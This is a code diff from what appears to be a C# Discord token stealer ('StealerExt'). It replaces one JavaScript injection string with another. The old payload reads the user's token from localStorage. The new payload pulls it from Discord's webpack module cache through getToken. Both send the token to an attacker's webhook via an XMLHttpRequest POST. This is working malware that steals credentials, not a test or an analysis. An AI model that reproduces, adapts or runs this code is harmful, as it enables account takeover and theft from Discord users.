@@ -12,7 +12,7 @@ namespace StealerExt
         public static bool Discord = false;
         public static bool DiscordCan = false;
         public static bool DiscordPTB = false;
-        private static readonly string StringToInject = "var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C[\"token\"];var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{\"content\": ' + strtoken + '}');";
+        private static readonly string StringToInject = "var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[[\"extra_id\"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)\"getToken\"===e&&(token=r.default.getToken())}; var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send(`{\"content\": \"${token}\"}`);";
         #endregion
         #region Injection...
         public static void StartInjection()
